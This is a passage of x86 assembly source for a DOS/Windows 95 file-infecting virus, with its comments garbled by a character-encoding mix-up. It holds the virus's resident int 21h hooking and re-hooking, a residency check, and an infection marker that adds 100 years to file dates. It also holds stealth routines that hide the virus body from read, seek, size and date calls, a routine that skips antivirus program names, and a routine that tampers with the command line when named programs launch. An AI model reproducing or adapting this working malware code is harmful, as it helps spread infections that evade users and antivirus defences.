           push    si di ax        ; á®åà ¥¨¥ ¯ à ¬¥âà®¢   ¡ã¤ãîé¥¥
           mov     ax,71a7h        ; ¯¥à¥¢®¤ ¢à¥¬¥¨ ¨§ ä®à¬ â 
           mov     bl,0            ; Win95 ¢ ä®à¬ â DOS
           mvs     ds,es           ; SI ãª §ë¢ ¥â   ¤ âã
           call    int21           ; á¥©ç á CX:DX á®¤¥à¦ â ®¡ëç®¥ DOS ¢à¥¬ï
           pop     ax di si        ; ¢®ááâ ®¢«¥¨¥ ¯ à ¬¥âà®¢
           mov     [si],cx         ; á®åà ¥¨¥ ¯ à ¬¥âà®¢ ¢ FindDataRecord
           mov     [si+2],dx

    dos_date:
           add     si,2            ; si -> ¤ â  ä ©« 
           call    sizst           ; di -> ¤«¨  ä ©« 
           sub     si,2

           cmp     ax,1            ; ¯à®¢¥àª  ä®à¬ â  ¢à¥¬¥¨
           jz      no_win

           mov     ax,71a7h        ; ¯¥à¥¢®¤ ¢à¥¬¥¨ ¨§ ä®à¬ â 
           mov     bl,1            ; DOS ¢ ä®à¬ â Win95
           mov     di,si           ; DI -> buffer ¤«ï ¢à¥¬¥¨ ¨ ¤ âë
           mov     cx,[di]         ; çâ¥¨¥ ¢à¥¬¥¨ ¨ ¤ âë ¢ ä®à¬ â¥ DOS
           mov     dx,[di+2]
           call    int21           ; á¥©ç á ES:[DI] á®¤¥à¦¨â ¢à¥¬ï Win95

    no_win:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; DATE stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    date_get:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    int21           ; § ¯à®á ¤ âë
           call    hidestm         ; ¬ áª¨à®¢ª  ¤ âë
           clc
           jmp     seek_ret

    date_set:
           call    OpenSFT         ; ®âªàëâì SFT
           call    int21           ; ãáâ ®¢ª  ¤ âë
           call    correctdate     ; ¯à ¢ª  ¤ âë
           jmp     seek_ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; LSEEK stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    seekstealth:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    HandleCheck     ; ¯à®¢¥àª  ä ©«  IOCTL
           jc      no_seek
           call    Inf_Check       ; ¨ä¨æ¨à®¢ ?
           jnc     no_seek

           push    cx              ; á®åà ¥¨¥ CX
           cmp     al,2            ; ¯à®¢¥àª  â¨¯ 
           jne     forw
           sub     dx,vsize        ; ¬ áª¨à®¢ª   áâ®ïé¥£® ª®æ  ä ©« 
           sbb     cx,0            ; á¤¢¨£ ¨¤¥â ®â £®«®¢ë ¢¨àãá 
    forw:  call    int21           ; §¤¥áì ãáâ ®¢ª  ãª § â¥«ï ¨¤¥â ®â  ç « 
           pop     cx              ; ¢®ááâ ®¢«¥¨¥ CX
           jc      seek_ret        ; ¨«¨ ®â â¥ªãé¥© ¯®§¨æ¨¨
           call    seekhide        ; ¡«®ª¨à®¢ª  ¯®¯ ¤ ¨ï lseek   â¥«® ¢¨àãá 
           mov     ax,cs:seek_pos
           mov     dx,cs:seek_pos+2
           jmp     seek_ret

    no_seek:
           call    int21           ; ¢ë§®¢ DOS
    seek_ret:
           call    CloseSFT        ; § ªàëâì SFT
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; READ stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    readstealth:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    HandleCheck     ; ¯à®¢¥àª  ä ©«  IOCTL
           jc      no_seek
           call    Inf_Check       ; ¨ä¨æ¨à®¢ ?
           jnc     no_seek

           call    SeekSave        ; á®åà ¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           call    int21           ; § ¯à®á çâ¥¨ï ¤ ëå
           jc      seek_ret
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     di,dx           ; ¤ã¡«¨à®¢ ¨¥ á¬¥é¥¨ï ¡ãä¥à 
           mov     cs:nrbytes,ax   ; ª®«¨ç¥áâ¢® ¯à®ç¨â ëå ¡ ©â

           cmp     D cs:seek_pos,32 ; ç¨â îâ § £®«®¢®ª?
           jae     zone
           call    crload          ; ¯à®ç¨â âì  áâ®ïé¥¥  ç «® ä ©« 

           lea     si,buffer       ; SI ->  áâ®ïé¥¥  ç «®
           add     si,cs:seek_pos  ; SI -> á ãç¥â¥¬ á¬¥é¥¨ï çâ¥¨ï

           mov     cx,cs:nrbytes   ; áç¨â ¥¬ ª®«¨ç¥áâ¢® ¡ ©â ª®â®àë¥  ¬ ã¦®
           add     cx,cs:seek_pos  ; á®áâ¥«á¨âì
           cmp     cx,32           ; ¯®§¨æ¨ï ª®æ  çâ¥¨ï «¥¦¨â §  ¯à¥¤¥«®¬
           jbe     $+5             ; á®åà ¥®£®  ç «  ä ©« ?
           mov     cx,32
           sub     cx,cs:seek_pos

           jcxz    zone            ; ¢ á«ãç ¥ çâ¥¨ï 0 ¡ ©â
    rhide: mov     al,cs:[si]      ; ¯®¤¬¥  ¨ä¨æ¨à®¢ ®£®  ç «  ä ©«   
           mov     [di],al         ; ®à¨£¨ «ì®¥
           inc     si
           inc     di
           loop    rhide

    zone:  call    seekhide        ; ¡«®ª¨àã¥¬ ¢®§¬®¦®áâì ¯®¯ ¤ ¨ï lseek  
           call    LoadRegs        ; §®ã ¢¨àãá  + ã¬¥ìè¥¨ï ç¨á«  ¯à®ç¨â ëå
           mov     ax,cs:nrbytes   ; ¡ ©â
           jmp     seek_ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ALL HANDLER stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    patchsft:
           call    OpenSFT         ; ®âªàëâì SFT
           jmp     no_seek

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; WRITE stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    diswrite:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    HandleCheck     ; ¯à®¢¥àª  ä ©«  IOCTL
           jc      no_seek
           call    Inf_Check       ; ¨ä¨æ¨à®¢ ?
           jnc     no_seek

           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           call    SeekSave        ; á®åà ¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           mvs     ds,cs           ; DS=CS

           call    crload          ; § £àã§ª  ®à¨£¨ «ì®£®  ç «  ¢ ¡ãä¥à
           call    seek2bof        ; ¯®¬¥áâ¨âì ãª § â¥«ì ¢  ç «® ä ©« 
           mov     cx,32           ; § ¯¨áì ®à¨£¨ «ì®£® § £®«®¢ª  ä ©« 
           lea     dx,buffer
           call    write
           xor     cx,ax           ; ®è¨¡ª ? ã â®£¤  ¯à¨ § ¯¨á¨ â®£®,
           jnz     disfail         ; ç¥£® ¯à®áïâ ®è¨¡ª  ¡ã¤¥â â®¦¥!

           mov     cx,-1           ; ¤¢¨£ ¥¬áï ª £®«®¢¥ ¢¨àãá . â.¥.
           mov     dx,-vsize       ; ª ª®æã § à ¦¥®© ¯à®£à ¬¬ë
           call    seekfrom_eof
           mov     ah,40h          ; ®¡à¥§ ¥¬ ä ©«
           xor     cx,cx           ; ã¤ «ï¥¬ â¥«® ¢¨àãá  ¨§ ¢¨àãá®®á¨â¥«ï
           call    int21
           mov     ah,68h          ; á¡à áë¢ ¥¬ ¡ãä¥à 
           call    int21
    disfail:
           call    RestoreSeek     ; ¢®ááâ  ¢«¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           call    LoadRegs        ; ¢®ááâ  ¢«¥¨¥ à¥£¨áâà®¢
           jmp     no_seek         ; ¢ëå®¤¨¬

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª  ¨ä¨æ¨à®¢ ®áâ¨ ¯ ¬ïâ¨
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    tsrtest:
           mov     ax,3265h        ; Hi, AX=3265
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¢â®àë© ¯¥à¥å¢ â ¢¥ªâ®à  int 21h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    rehook:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           call    chk_dup         ; ¯à®¢¥àª , ¡ë« «¨ ¢¥ªâ®à ã¦¥
           jnz     no_hook         ; ¯¥à¥ãáâ ®¢«¥
           call    WinOldAp        ; ¯à®¢¥àª , çâ®-¨¡ã¤ì ¨§¬¥¨«®áì á
           cmp     ax,cs:w95state  ; ¬®¬¥â  ¨áâ ««ïæ¨¨ ¢¨àãá  ¢ ¯ ¬ïâì
           jz      no_hook         ; (¡ë«  «¨ § £àã¦¥  Win95)

           mov     ax,3521h        ; ¯®«ãç¥¨¥ ¢¥ªâ®à  int 21h
           int     21h
           mov     ax,2521h        ; ãáâ ®¢ª  ®¢®£® ¢¥ªâ®à  ¯à¥àë¢ ¨ï
           lea     dx,manager
           mvs     ds,cs
           int     21h
           call    set_dup         ; á®åà ¥¨¥ ¢¥ªâ®à  ¢ ¤àã£®© ïç¥©ª¥ IVT
    no_hook:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     exithandler

   ; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ> SúUúBúRúOúUúTúIúNúEúS <ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; § à ¦¥¨¥ ¥ª®â®àëå ¦¨§¥® ¢ ¦ëå ä ©«®¢
   ; ¨á¯®«ì§ã¥â STACKS ¢ ª ç¥áâ¢¥ ¡ãä¥à  ¤«ï ¨¬¥ ä ©«®¢
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    FixVirus:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     si,2ch
           mov     ds,cs:[si]      ; § £àã§ª  á¥£¬¥â  Environment
           xor     si,si
           mvs     es,cs
           lea     di,windir       ; ES:DI -> WINDIR=
    wdlook4:
           call    compare         ; áà ¢¥¨¥ í«¥¬¥¨â  envir á è ¡«®®¬
           jz      wdfound
           cmp     w [si],0
           jz      fverror
           inc     si
           jmp     wdlook4
    wdfound:
           add     si,11           ; SI -> ¤¨à¥ªâ®à¨ï windows
           lea     di,stacks
           lodsb
           stosb
           or      al,al
           jnz     $-4
           mvs     ds,cs
           lea     bx,[di-1]
           lea     si,fixes

    fvinfect:
           cmp     b [si],0
           jz      fverror
           mov     di,bx
           lodsb
           stosb
           or      al,al
           jnz     $-4

           mov     ax,1857h
           lea     dx,stacks
           int     21h
           jmp     fvinfect

    fverror:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Open/Close SFT - ¯®¤¯à®£à ¬¬  ¤«ï § ªàëâ¨ï/®âªàëâ¨ï ®à¬ «ì®© SFT
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    OpenSFT:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     si,0            ; "Open"
           jmp     Manipulate

    CloseSFT:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     si,1            ; "Close"

    Manipulate:
           mov     bp,bx           ; á®åà ¥¨¥ handle
           call    HandleCheck     ; ¯à®¢¥àª , íâ® ä ©« ¨«¨ chardevice
           jc      SFT_Error

           mov     ax,1220h        ; ¯®«ãç¥¨¥ JFT ¤«ï íâ®£® ä ©« 
           int     2fh
           jc      SFT_Error
           xor     bx,bx
           mov     bl,es:[di]      ; BL = System file entry
           cmp     bl,0ffh
           je      SFT_Error
           mov     ax,1216h        ; ¯®«ãç¥¨¥  ¤à¥á  SFT ¢ ES:DI
           int     2fh
           jc      SFT_Error

           mov     bx,bp           ; ¢®ááâ ®¢«¥¨¥ handle
           call    Inf_Check       ; ¯à®¢¥àª  ¨ä¨æ¨à®¢ ®áâ¨ ä ©« 
           jnc     SFT_Error       ; ¢ëå®¤ ¢ á«ãç ¥ ç¨áâ®£® ä ©« 

           mov     eax,vsize
           cmp     si,0            ; "Open"?
           jz      open
           neg     eax
    open:  add     es:[di+11h],eax ; á®åà ¥¨¥ ¢ SFT à §¬¥à 

           mov     dx,es:[di+0fh]  ; ¯®«ãç¥¨¥ ¤ âë ä ©« 
           call    hidestm         ; áªàëâ¨¥ «¨è¨å 100 «¥â
           cmp     si,0            ; "Open"?
           jnz     clsft
           ror     dh,1            ; ã¢¥«¨ç¥¨¥ ¤ âë ä ©« 
           add     dh,100
           rol     dh,1
    clsft: mov     es:[di+0fh],dx  ; á®åà ¥¨¥ ¨§¬¥¥®© ¤ âë

    SFT_Error:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª   ªâ¨¢®áâ¨ Win95 (¨á¯®«ì§ãï WinOldAp)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    WinOldAp:
           mov     ax,1700h        ; äãªæ¨ï WinOldAp Installation Check
           int     2fh             ; ¯à®£à ¬¬ , ª®â®à ï ¯à¨áãâáâ¢ã¥â ¢ Win95
           ret                     ; ¢ 32-à §àï¤®¬ PE à¥¦¨¬¥

    get_dup:
           push    ds si           ; § £àã§ª  à¥£¨áâà®¢ ES:BX ®à¨£¨ «ìë¬
           mvs     ds,0            ; ¢¥ªâ®à®¬ 21-£® ¯à¥àë¢ ¨ï
           mov     si,63h*4
           mov     bx,[si]
           mov     es,[si+2]
           pop     si ds
           ret

    set_dup:
           push    ds si           ; á®åà ¥¨¥ ES:BX ¢ 63-© ¢¥ªâ®à¥
           mvs     ds,0            ; ¯à¥àë¢ ¨ï
           mov     si,63h*4
           mov     [si],bx
           mov     [si+2],es
           pop     si ds
           ret

    chk_dup:
           push    ds si eax       ; ¯à®¢¥àª  ¨§¬¥¥¨¥ 63-£® ¢¥ªâ®à 
           mvs     ds,0            ; ¯à¥àë¢ ¨ï
           mov     si,63h*4
           mov     eax,[si]
           cmp     D cs:io21p,eax
           pop     eax si ds
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; size stealth
   ; ES:SI -> „ â  ä ©« 
   ; ES:DI -> „«¨  ä ©« 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    sizst: mov     dx,es:[si]      ; dx = ¤ â  ä ©« 
           call    hidestm         ; ¬ áª¨à®¢ª  ¨ ¯à®¢¥àª  100 «¨è¨å «¥â
           jnc     oklen           ; ä ©« ¨ä¨æ¨à®¢ ?
           mov     W es:[si],dx    ; ãáâ ®¢¨âì ®à¬ «ìãî ¤ âã ä ©« 
           sub     W es:[di],vsize ; ¬ áª¨à®¢ª  ¯à¨à é¥¨ï ¤«¨ë ä ©« 
           sbb     W es:[di+2],0
    oklen: ret

    hidestm:
           push    dx              ; á®åà ¨âì ¤ âã ¢ áâ¥ª¥
           shr     dh,1            ; ¯®«ãç¨âì £®¤ ä ©« 
           cmp     dh,100          ; áà ¢¥¨¥ ¥£® á 100
           pop     dx              ; ¢®ááâ ®¢¨âì ¤ âã
           jb      okinf
           ror     dh,1            ; ¯®«ãç¨âì £®¤ ä ©« 
           sub     dh,100          ; á¯àïâ âì «¨è¥¥
           rol     dh,1            ;
           stc                     ; ä ©« § à ¦¥!
           ret
    okinf: clc
           ret

    correctdate:
           mov     ax,5700h        ; ãáâ ®¢ª  ¤ âë ä ©«  ¢ § ¢¨á¨¬®áâ¨
           call    int21           ; ®â â®£®, § à ¦¥ «¨ ®
           call    HideStm         ; ®à¬ «ì ï ¤ â 
           call    Inf_Check       ; ¯à®¢¥à¨âì ä ©«   § à ¦¥®áâì
           jnc     okdat
           ror     dh,1
           add     dh,100
           rol     dh,1
    okdat: mov     ax,5701h        ; ãáâ ®¢ª  ®âª®àà¥ªâ¨à®¢ ®©
           call    int21           ; ¤ âë ä ©« 
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; *à®¢¥àª  ¨¬¥¨ ä ©«  (AVs ¨ æ¨äàë)
   ; *à®¢¥àª  à áè¨à¥¨ï ä ©«  (Extens)
   ; *à¨ SAVE_AX=4B00 ¤®¡ ¢«¥¨¥ ¯ à ¬¥âà®¢ ¢ cmdline
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Filename:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           cld

           mov     si,dx           ; á¬¥é¥¨¥ ¨¬¥¨ ¢ ¨¤¥ªáë© à¥£¨áâà
    nfind: lodsb                   ; ¯®¨áª ¨¬¥¨ ä ©« 
           cmp     al,':'          ; ¢  è¥¬ á«ãç ¥ ®® ¡ã¤¥â á«¥¤®¢ âì
           jz      separ           ; §  ¯®á«¥¤¨¬ "/", "\", ":"
           cmp     al,'\'
           jz      separ
           cmp     al,'/'
           jnz     store
    separ: mov     dx,si           ; á®åà ¨âì á¬¥é¥¨¥

    store: or      al,al           ; ¯à®¢¥àª  ª®æ  áâà®ª¨ (0)
           jnz     nfind

           mov     si,dx           ; SI -> ¨¬ï ä ©« 
           xor     di,di           ; à áè¨à¥¨¥ ¯®ª  ¥  ©¤¥®
    gext:  lodsb
           cmp     al,'.'          ; à áè¨à¥¨¥?
           jnz     $+4
           mov     di,si
           or      al,al
           jnz     gext
           or      di,di           ; ¥á«¨ â®ç¥ª ¢ ¨¬¥¨ ä ©« 
           jz      Bad_File        ; ®¡ àã¦¥® ¥ ¡ë«®

           lea     bp,[di-1]       ; á¥©ç á BP-à áè¨à¥¨¥ ä ©« , DX-¥£® ¨¬ï
           mvs     es,cs           ; ES=CS

           cmp     cs:save_ax,4b00h
           jne     no_add
           mov     si,dx           ; SI -> ¨¬ï ä ©« 
           lea     di,prms         ; â ¡«¨çª  (ä®à¬ â: avname,0,0,cmdline,0dh)

    scancmd:
           call    compare         ; áà ¢¥¨¥ ¨¬¥¨ § ¯ãáª ¥¬®© ¯à®£à ¬¬ë
           jz      addprm          ; á ¯à¥¤ãá¬®âà¥ë¬ ¨¬¥¥¬ ¨§ â ¡«¨æë
           mov     al,0dh
           mov     cx,0ffffh
           repne   scasb
           cmp     b cs:[di],0     ; ª®¥æ â ¡«¨æë?
           jnz     scancmd         ; ¢ â ¡«¨æ¥ ¨¬ï ¥  ©¤¥® - § ¯ãé¥ 
           jmp     no_add          ; ¤àã£ ï ¯à®£à ¬¬ 

    addprm:
           push    es              ; á®åà ¥¨¥ ES
           mov     al,0
           mov     cx,0ffffh
           repne   scasb
           lea     si,[di+1]
           les     bx,d cs:save_bx ; § £àã§ª  ¢ ES:BX  ¤à¥á  EPB
           les     bx,es:[bx+2]    ; § £àã§ª   ¤à¥á  ª®¬ ¤®© áâà®ª¨ ¢ ES:BX
           mov     di,bx
    getdx: inc     di              ; áª ¨àã¥¬ ª®¬ ¤ãî áâà®ªã
           cmp     b es:[di],0dh   ; ª®¥æ áâà®ª¨?
           jnz     getdx
           mov     cx,-1           ; áç¥âç¨ª ¤«¨ë ¤®¯®«¨â¥«ì®£® ¯ à ¬¥âà 
           lods    b cs:[si]       ; § £àã§ª  ¡ ©â  ¯ à ¬¥âà 
           stosb                   ; á®åà ¥¨¥ ¡ ©â  ¯ à ¬¥âà 
           inc     cx              ; ã¢¥«¨ç¥¨¥ áç¥âç¨ª 
           cmp     al,0dh          ; ¯à®¢¥àª    ®ª®ç ¨¥ ¯ à ¬¥âà 
           jnz     $-6
           add     es:[bx],cl      ; ã¢¥«¨ç¥¨¥ ¤«¨ë ª®¬ ¤®© áâà®ª¨
           pop     es              ; ¢®ááâ ®¢«¥¨¥ ES

    no_add:
           mov     si,bp
           lea     di,extens       ; ES:DI ãª §ë¢ îâ   â ¡«¨æã á
           call    compare         ; à §à¥è¥ë¬¨ à áè¨à¥¨ï¬¨
           jnz     Bad_File        ; ¥ª®àà¥ªâ®¥ à áè¨à¥¨¥?

           mov     si,dx           ; SI -> ¨¬ï ä ©« 
           lea     di,AVs          ; ES:DI -> â ¡«¨æ  á ¨¬¥ ¬¨
           call    compare         ; áà ¢¥¨¥ ¨¬¥
           jz      Bad_File        ; ¥•®*®è¥¥ ¨¬ï

    digit: lodsb                   ; ¯à®¢¥àï¥¬, ¥áâì «¨ ¢ ¨¬¥¨ ä ©«  æ¨äàë
           cmp     al,'0'
           jb      nodig
           cmp     al,'9'
           jbe     Bad_File
    nodig: or      al,al
           jnz     digit

           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           clc                     ; ®ç¨áâª  CF
           ret

    Bad_File:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           stc                     ; ãáâ ®¢ª  CF
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ãáâ ®¢ª  ¡ ©â  STF ¢ § ¢¨á¨¬®áâ¨ ®â â¥ªãé¥£® PSP/MCB
   ; ¡ ©â à ¢¥ 1 ¥á«¨ â¥ªãé¨© MCB ¯à¨ ¤«¥¦¨â ¯à®£à ¬¬¥ ¨§ STLOCK
   ; ¡ ©â à ¢¥ 0 ¥á«¨ ¢« ¤¥«¥æ â¥ªãé¥£® MB ¥ § à¥£¨áâà¨à®¢  ¢ STLOCK
   ; ¡ ©â COMMAND à ¢¥ 1 ¥á«¨ â¥ªãé¨© MB ¯à¨ ¤«¥¦¨â command.com'ã
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    mcbcheck:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢

           mov     ah,62h          ; § ¯à®á á¥£¬¥â  â¥ªãé¥£® PSP
           call    int21
           dec     bx              ; ¯®«ãç¥¨¥ á¥£¬¥â  MCB
           mov     ds,bx           ; DS:SI ãª §ë¢ îâ   ¢« ¤¥«ìæ  MB
           mov     si,08h          ;
           lea     di,stlock       ; ES:DI ãª §ë¢ îâ    è
           mvs     es,cs           ; á¯¨á®ª ¨¬¥ STLOCK
           call    compare         ; áà ¢¥¨¥ ¤ ëå
           sete    cs:stf          ; ãáâ ®¢ª  áâ¥«á-ä« £ 

           lea     di,comspec      ; ¯à®¢¥àª  ¢« ¤¥«ìæ  â¥ªãé¥£®
           call    compare         ; ¡«®ª    command.com
           sete    cs:command
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; COMPARE - áà ¢¥¨¥ ¤ ëå
   ; DS:SI - ¨áâ®ç¨ª
   ; ES:DI - â ¡«¨æ  (Data1,0,Data2,0,...,DataN,0,0)
   ; ‚ëå®¤: ZF = 1 ¢ á«ãç ¥ á®¢¯ ¤¥¨ï ¤ ëå
   ; *¥£¨áâà « â¨áª¨å ¡ãª¢ § ç¥¨ï ¥ ¨¬¥¥â
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    compare:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     dx,si           ; ¤ã¡«¨à®¢ ¨¥ á¬¥é¥¨ï ¨áâ®ç¨ª 

    data1: mov     si,dx           ; ¢®ááâ ®¢«¥¨¥ á¬¥é¥¨ï ¨áâ®ç¨ª 
    data2: mov     al,ds:[si]      ; çâ¥¨ï ¡ ©â  ¨áâ®ç¨ª 
           mov     ah,es:[di]      ; çâ¥¨ï ¡ ©â  â ¡«¨æë
           inc     di              ; ã¢¥«¨ç¥¨¥ ¨¤¥ªáëå à¥£¨áâà®¢
           inc     si              ;
           call    upreg           ; ¯¥à¥¢®¤ á¨¬¢®«®¢ ¢ ¢¥àå¨© à¥£¨áâà
           or      ah,ah           ; ¥á«¨ ¢ â ¡«¨æ¥ ®¡à §®¢ «áï 0 =>
           jz      equal           ; => ¤ ë¥ á®¢¯ «¨
           cmp     al,ah           ; ¨ ç¥ ¯®¡ ©â®¥ áà ¢¥¨¥
           jz      data2           ; ¥á«¨ ¡ ©âë á®¢¯ «¨, ¯à®¢¥àï¥¬ ¤ «ìè¥

    data3: cmp     B es:[di],0     ; ¡ë©âë ¥ á®¢¯ «¨, ¡¥à¥¬ á«¥¤ãîé¥¥
           jz      data4           ; ¯®«¥
           inc     di
           jmp     data3

    data4: inc     di
           cmp     B es:[di],0     ; ¯à®¢¥àª    ¯®á«¥¤îî § ¯¨áì ¢
           jnz     data1           ; â ¡«¨æ¥

           call    LoadRegs        ; â ¡«¨æ  ª®ç¨« áì: á®¢¯ ¤¥¨© ¥  ©¤¥®
           cmp     di,-1           ; ®ç¨áâª  ZF
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë

    equal: call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           cmp     al,al           ; ãáâ ®¢ª  ZF
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; á®åà ¥¨¥ ¨ § £àã§ª  à¥£¨áâà®¢ ¨§ áâ¥ª 
   ; FLAGS EAX BX CX DX SI DI BP ES DS
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    SaveRegs:
           pushf                   ; á®åà ¥¨¥ á ¬¨å à¥£¨áâà®¢
           push    eax bx cx dx si di bp es ds
           mov     bp,sp
           push    w [bp+22]       ; ª®¯¨à®¢ ¨¥  ¤à¥á  ¢®§¢à â 
           mov     bp,[bp+4]       ; ¢®ááâ ®¢«¥¨¥ BP
           ret

    LoadRegs:
           mov     bp,sp           ; ª®¯¨à®¢ ¨¥  ¤à¥á  ¢®§¢à â  ¢ ¯ãáâãî
           pop     W [bp+24]       ; ïç¥©ªã áâ¥ª  (®áâ « áì ®â SaveRegs)
           pop     ds es bp di si dx cx bx eax
           popf
           ret

